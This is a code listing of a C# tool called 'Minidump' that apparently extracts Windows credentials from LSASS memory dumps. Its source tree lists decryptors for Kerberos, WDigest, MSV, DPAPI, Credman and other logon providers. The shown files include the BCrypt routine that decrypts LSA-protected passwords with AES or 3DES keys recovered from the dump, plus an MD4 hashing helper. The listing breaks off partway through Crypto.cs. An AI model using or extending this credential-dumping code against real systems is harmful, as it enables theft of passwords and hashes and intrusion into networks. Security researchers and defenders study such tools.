Project Path: arc_gmh5225_minidump_zp2vishb

Source Tree:

```txt
arc_gmh5225_minidump_zp2vishb
├── App.config
├── Crypto
│   ├── BCrypt.cs
│   └── Crypto.cs
├── Decryptor
│   ├── Cloudap_.cs
│   ├── Credman.cs
│   ├── Dpapi_.cs
│   ├── KerberosSessions.cs
│   ├── Kerberos_.cs
│   ├── LiveSsp_.cs
│   ├── LogonSessions.cs
│   ├── Msv1_.cs
│   ├── Rdp_.cs
│   ├── Ssp_.cs
│   ├── Tspkg_.cs
│   ├── WDigest_.cs
│   ├── lsadecryptor_lsa_decryptor.cs
│   ├── lsadecryptor_lsa_decryptor_nt5.cs
│   └── lsadecryptor_lsa_decryptor_nt6.cs
├── Helpers.cs
├── Images
│   └── poc.png
├── Minidump.csproj
├── Minidump.csproj.user
├── Minidump.sln
├── Program.cs
├── Properties
│   └── AssemblyInfo.cs
├── README.md
├── Streams
│   ├── Directory.cs
│   ├── Header.cs
│   ├── Memory64ListStream.cs
│   ├── Memory86ListStream.cs
│   ├── MinidumpMemory.cs
│   ├── ModuleList.cs
│   ├── Parse.cs
│   └── SystemInfo.cs
├── Templates
│   ├── cloudap_templates.cs
│   ├── credman_templates.cs
│   ├── dpapi_templates.cs
│   ├── kerberos_templates.cs
│   ├── livessp_templates.cs
│   ├── lsa_template_nt5.cs
│   ├── lsa_template_nt6.cs
│   ├── lsa_templates.cs
│   ├── msv_templates.cs
│   ├── rdp_templates.cs
│   ├── ssp_templates.cs
│   ├── tspkg_templates.cs
│   └── wdigest_templates.cs
└── obj
    └── Release
        └── Minidump.csproj.FileListAbsolute.txt

```

`App.config`:

```config
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />
    </startup>
</configuration>
```

`Crypto/BCrypt.cs`:

```cs
using Microsoft.Win32.SafeHandles;
using Minidump.Decryptor;
using System;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;

namespace Minidump.Crypto
{
#pragma warning disable 618

    [SecurityCritical(SecurityCriticalScope.Everything)]
#pragma warning restore 618
    public sealed class SafeBCryptAlgorithmHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeBCryptAlgorithmHandle() : base(true)
        {
        }

        protected override bool ReleaseHandle()
        {
            return (NTStatus)BCrypt.BCryptCloseAlgorithmProvider(handle, 0) == NTStatus.Success;
        }
    }

    [SecuritySafeCritical]
    public sealed class SafeBCryptKeyHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        internal SafeBCryptKeyHandle() : base(true)
        {
        }

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        protected override bool ReleaseHandle()
        {
            return (NTStatus)BCrypt.BCryptDestroyKey(handle) == NTStatus.Success;
        }
    }

    public enum NTStatus : uint
    {
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        ProcessIsTerminating = 0xC000010A,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,

        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,

        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,

        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        PagefileQuota = 0xc0000007,
        InvalidHandle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        InsufficientBuffer = 0x7a,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,

        MaximumNtStatus = 0xffffffff
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_ALG_HANDLE
    {
        private IntPtr handle;

        /// <summary>Initializes a new instance of the <see cref="BCRYPT_ALG_HANDLE"/> struct.</summary>
        /// <param name="preexistingHandle">An <see cref="IntPtr"/> object that represents the pre-existing handle to use.</param>
        public BCRYPT_ALG_HANDLE(IntPtr preexistingHandle) => handle = preexistingHandle;

        /// <summary>Returns an invalid handle by instantiating a <see cref="BCRYPT_ALG_HANDLE"/> object with <see cref="IntPtr.Zero"/>.</summary>
        public static BCRYPT_ALG_HANDLE NULL => new BCRYPT_ALG_HANDLE(IntPtr.Zero);

        /// <summary>Gets a value indicating whether this instance is a null handle.</summary>
        public bool IsNull => handle == IntPtr.Zero;

        /// <summary>Performs an explicit conversion from <see cref="BCRYPT_ALG_HANDLE"/> to <see cref="IntPtr"/>.</summary>
        /// <param name="h">The handle.</param>
        /// <returns>The result of the conversion.</returns>
        public static explicit operator IntPtr(BCRYPT_ALG_HANDLE h) => h.handle;

        /// <summary>Performs an implicit conversion from <see cref="IntPtr"/> to <see cref="BCRYPT_ALG_HANDLE"/>.</summary>
        /// <param name="h">The pointer to a handle.</param>
        /// <returns>The result of the conversion.</returns>
        public static implicit operator BCRYPT_ALG_HANDLE(IntPtr h) => new BCRYPT_ALG_HANDLE(h);

        /// <summary>Implements the operator !=.</summary>
        /// <param name="h1">The first handle.</param>
        /// <param name="h2">The second handle.</param>
        /// <returns>The result of the operator.</returns>
        public static bool operator !=(BCRYPT_ALG_HANDLE h1, BCRYPT_ALG_HANDLE h2) => !(h1 == h2);

        /// <summary>Implements the operator ==.</summary>
        /// <param name="h1">The first handle.</param>
        /// <param name="h2">The second handle.</param>
        /// <returns>The result of the operator.</returns>
        public static bool operator ==(BCRYPT_ALG_HANDLE h1, BCRYPT_ALG_HANDLE h2) => h1.Equals(h2);

        /// <inheritdoc/>
        public override bool Equals(object obj) => obj is BCRYPT_ALG_HANDLE h ? handle == h.handle : false;

        /// <inheritdoc/>
        public override int GetHashCode() => handle.GetHashCode();

        /// <inheritdoc/>
        public IntPtr DangerousGetHandle() => handle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_KEY_HANDLE
    {
        private IntPtr handle;

        /// <summary>Initializes a new instance of the <see cref="BCRYPT_KEY_HANDLE"/> struct.</summary>
        /// <param name="preexistingHandle">An <see cref="IntPtr"/> object that represents the pre-existing handle to use.</param>
        public BCRYPT_KEY_HANDLE(IntPtr preexistingHandle) => handle = preexistingHandle;

        /// <summary>Returns an invalid handle by instantiating a <see cref="BCRYPT_KEY_HANDLE"/> object with <see cref="IntPtr.Zero"/>.</summary>
        public static BCRYPT_KEY_HANDLE NULL => new BCRYPT_KEY_HANDLE(IntPtr.Zero);

        /// <summary>Gets a value indicating whether this instance is a null handle.</summary>
        public bool IsNull => handle == IntPtr.Zero;

        /// <summary>Performs an explicit conversion from <see cref="BCRYPT_KEY_HANDLE"/> to <see cref="IntPtr"/>.</summary>
        /// <param name="h">The handle.</param>
        /// <returns>The result of the conversion.</returns>
        public static explicit operator IntPtr(BCRYPT_KEY_HANDLE h) => h.handle;

        /// <summary>Performs an implicit conversion from <see cref="IntPtr"/> to <see cref="BCRYPT_KEY_HANDLE"/>.</summary>
        /// <param name="h">The pointer to a handle.</param>
        /// <returns>The result of the conversion.</returns>
        public static implicit operator BCRYPT_KEY_HANDLE(IntPtr h) => new BCRYPT_KEY_HANDLE(h);

        /// <summary>Implements the operator !=.</summary>
        /// <param name="h1">The first handle.</param>
        /// <param name="h2">The second handle.</param>
        /// <returns>The result of the operator.</returns>
        public static bool operator !=(BCRYPT_KEY_HANDLE h1, BCRYPT_KEY_HANDLE h2) => !(h1 == h2);

        /// <summary>Implements the operator ==.</summary>
        /// <param name="h1">The first handle.</param>
        /// <param name="h2">The second handle.</param>
        /// <returns>The result of the operator.</returns>
        public static bool operator ==(BCRYPT_KEY_HANDLE h1, BCRYPT_KEY_HANDLE h2) => h1.Equals(h2);

        /// <inheritdoc/>
        public override bool Equals(object obj) => obj is BCRYPT_KEY_HANDLE h ? handle == h.handle : false;

        /// <inheritdoc/>
        public override int GetHashCode() => handle.GetHashCode();

        /// <inheritdoc/>
        public IntPtr DangerousGetHandle() => handle;
    }

    internal class BCrypt
    {
        [DllImport("bcrypt", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern NTStatus BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE hAlgorithm, uint dwFlags = 0);

        [DllImport("bcrypt", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern NTStatus BCryptDestroyKey(BCRYPT_KEY_HANDLE hKey);

        [DllImport("bcrypt", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern NTStatus BCryptDecrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, [Optional] IntPtr pbOutput, [Optional] int cbOutput, out int pcbResult, int dwFlags);

        [DllImport("bcrypt", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern NTStatus BCryptOpenAlgorithmProvider(out SafeBCryptAlgorithmHandle phAlgorithm, string pszAlgId, [Optional] string pszImplementation, int dwFlags = 0);

        [DllImport("bcrypt", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern NTStatus BCryptSetProperty(SafeBCryptAlgorithmHandle hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, string pbInput, int cbInput, uint dwFlags = 0);

        [DllImport("bcrypt", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern NTStatus BCryptGenerateSymmetricKey(SafeBCryptAlgorithmHandle hAlgorithm, out SafeBCryptKeyHandle phKey, [Optional] IntPtr pbKeyObject, [Optional] int cbKeyObject, IntPtr pbSecret, int cbSecret, int dwFlags = 0);

        [DllImport("bcrypt", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern NTStatus BCryptGetProperty(SafeBCryptAlgorithmHandle hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, out uint pcbResult, int dwFlags = 0);

        public static string BCRYPT_AES_ALGORITHM = "AES";
        public static string BCRYPT_3DES_ALGORITHM = "3DES";
        public static string BCRYPT_CHAINING_MODE = "ChainingMode";

        public static string BCRYPT_CHAIN_MODE_CBC = "ChainingModeCBC";
        public static string BCRYPT_CHAIN_MODE_CFB = "ChainingModeCFB";

        //public static ArraySegment<byte> BCryptGetProperty(SafeBCryptAlgorithmHandle hObject, string propertyName)
        //{
        //    uint length;
        //    BCryptGetProperty(hObject, propertyName, IntPtr.Zero, 0, out length, 0);
        //    byte[] result = new byte[length];
        //    BCryptGetProperty(hObject, propertyName, result, result.Length, out length, 0);
        //    return new ArraySegment<byte>(result, 0, length);
        //}

        public static byte[] DecryptCredentials(byte[] encrypedPass, LsaDecryptor.LsaKeys lsakeys)
        {
            SafeBCryptAlgorithmHandle hProvider, hDesProvider;
            SafeBCryptKeyHandle hAes, hDes;
            int result;
            NTStatus status;

            var passDecrypted = new byte[encrypedPass.Length + 1];
            var initializationVector = new byte[16];

            Array.Copy(lsakeys.iv, initializationVector, lsakeys.iv.Length);

            if (encrypedPass.Length % 8 != 0)
            {
                initializationVector = new byte[16];

                BCryptOpenAlgorithmProvider(out hProvider, BCRYPT_AES_ALGORITHM, null, 0);

                using (hProvider)
                {
                    BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CFB, BCRYPT_CHAIN_MODE_CFB.Length, 0);

                    var pkeypinnedArray = GCHandle.Alloc(lsakeys.aes_key, GCHandleType.Pinned);
                    var pkey = pkeypinnedArray.AddrOfPinnedObject();

                    var pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
                    var pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();

                    var pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
                    var pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();

                    var ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                    var ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();

                    //byte[] testb = new byte[0];
                    //BCryptGetProperty(hProvider, "ObjectLength", testb, 0, out uint pcbResult, 0);
                    //Console.WriteLine(pcbResult);
                    //testb = new byte[pcbResult];
                    //BCryptGetProperty(hProvider, "ObjectLength", testb, testb.Length, out uint pcbResult2, 0);
                    //Console.WriteLine(Helpers.ByteArrayToString(testb));

                    BCryptGenerateSymmetricKey(hProvider, out hAes, IntPtr.Zero, 0, pkey, lsakeys.aes_key.Length, 0);
                    using (hAes)
                    {
                        status = (NTStatus)BCryptDecrypt(hAes, pencrypedPass, encrypedPass.Length, IntPtr.Zero,
                            pinitializationVector, initializationVector.Length, ppassDecrypted, passDecrypted.Length, out result, 0);

                        if (status != 0) return new byte[0];
                    }
                }
            }
            else
            {
                BCryptOpenAlgorithmProvider(out hDesProvider, BCRYPT_3DES_ALGORITHM, null, 0);

                using (hDesProvider)
                {
                    BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC,
                        BCRYPT_CHAIN_MODE_CBC.Length, 0);

                    var pkeypinnedArray = GCHandle.Alloc(lsakeys.des_key, GCHandleType.Pinned);
                    var pkey = pkeypinnedArray.AddrOfPinnedObject();

                    var pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
                    var pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();

                    var pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
                    var pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();

                    var ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                    var ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();

                    BCryptGenerateSymmetricKey(hDesProvider, out hDes, IntPtr.Zero, 0, pkey, lsakeys.des_key.Length, 0);
                    using (hDes)
                    {
                        status = (NTStatus)BCryptDecrypt(hDes, pencrypedPass, encrypedPass.Length, IntPtr.Zero,
                            pinitializationVector, (initializationVector.Length / 2), ppassDecrypted, passDecrypted.Length, out result, 0);
                        if (status != 0) return new byte[0];
                    }
                }
            }

            Array.Resize(ref passDecrypted, result);
            return passDecrypted;
        }

        public static string GetHashSHA1(byte[] data)
        {
            using (var sha1 = new System.Security.Cryptography.SHA1CryptoServiceProvider())
            {
                return string.Concat(sha1.ComputeHash(data).Select(x => x.ToString("X2")));
            }
        }
    }
}
```

`Crypto/Crypto.cs`:

```cs
using System.Diagnostics.Contracts;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace System.Security.Cryptography
{
    internal static class Ext
    {
        public static HashAlgorithm MD4Singleton;

        static Ext()
        {
            MD4Singleton = System.Security.Cryptography.MD4.Create();
        }

        public static byte[] MD4(this byte[] s)
        {
            return MD4Singleton.ComputeHash(s);
        }

        public static string AsHexString(this byte[] bytes)
        {
            return String.Join("", bytes.Select(h => h.ToString("X2")));
        }
    }

    [System.Runtime.InteropServices.ComVisible(true)]
    public abstract class MD4 : HashAlgorithm
    {
        static MD4()
        {
            CryptoConfig.AddAlgorithm(typeof(MD4CryptoServiceProvider), "System.Security.Cryptography.MD4");
        }

        protected MD4()
        {
            HashSizeValue = 128;
        }

        new static public MD4 Create()
        {
            return Create("System.Security.Cryptography.MD4");
        }

        new static public MD4 Create(string algName)
        {
            return (MD4)CryptoConfig.CreateFromName(algName);
        }
    }

    [System.Runtime.InteropServices.ComVisible(true)]
    public sealed class MD4CryptoServiceProvider : MD4
    {
        internal static class Utils
        {
            internal static Type UtilsType = Type.GetType("System.Security.Cryptography.Utils");

            public static T InvokeInternalMethodOfType<T>(object o, object pType, string methodName, params object[] args)
            {
                var internalType = (pType is string internalTypeName) ? Type.GetType(internalTypeName) : (Type)pType;
                var internalMethods = internalType.GetMethods(BindingFlags.NonPublic | BindingFlags.FlattenHierarchy | (o == null ? BindingFlags.Static : 0));
                var internalMethod = internalMethods.Where(m => m.Name == methodName && m.GetParameters().Length == args.Length).Single();
                return (T)internalMethod?.Invoke(o, args);
            }

            public static T GetInternalPropertyValueOfInternalType<T>(object o, object pType, string propertyName)
            {
                var internalType = (pType is string internalTypeName) ? Type.GetType(internalTypeName) : (Type)pType;
                var internalProperty = internalType.GetProperty(propertyName, BindingFlags.NonPublic | (o == null ? BindingFlags.Static : 0));
                return (T)internalProperty.GetValue(o);
            }

            internal static SafeHandle CreateHash(int algid)
            {
                return InvokeInternalMethodOfType<SafeHandle>(null, UtilsType, "CreateHash", GetInternalPropertyValueOfInternalType<object>(null, UtilsType, "StaticProvHandle"), algid);
            }

            internal static void HashData(SafeHandle h, byte[] data, int ibStart, int cbSize)
            {
                InvokeInternalMethodOfType<object>(null, UtilsType, "HashData", h, data, ibStart, cbSize);
            }

            internal static byte[] EndHash(SafeHandle h)
            {
                return InvokeInternalMethodOfType<byte[]>(null, UtilsType, "EndHash", h);
            }
        }

        internal const int ALG_CLASS_HASH = (4 << 13);
        internal const int ALG_TYPE_ANY = (0);
        internal const int ALG_SID_MD4 = 2;
        internal const int CALG_MD4 = (ALG_CLASS_HASH | ALG_TYPE_ANY | ALG_SID_MD4);

        [System.Security.SecurityCritical]
        private SafeHandle _safeHashHandle = null;

        [System.Security.SecuritySafeCritical]
        public MD4CryptoServiceProvider()
        {
            if (CryptoConfig.AllowOnlyFipsAlgorithms)
                throw new InvalidOperationException("Cryptography_NonCompliantFIPSAlgorithm");
            Contract.EndContractBlock();
            // cheat with Reflection
            _safeHashHandle = Utils.CreateHash(CALG_MD4);
        }

        protected override void Dispose(bool disposing)
        {
            if (_safeHashHandle != null && !_safeHashHandle.IsClosed)
                _safeHashHandle.Dispose();
            base.Dispose(disposing);
        }

        public override void Initialize()
        {
            if (_safeHashHandle != null && !_safeHashHandle.IsClosed)
                _safeHashHandle.Dispose();

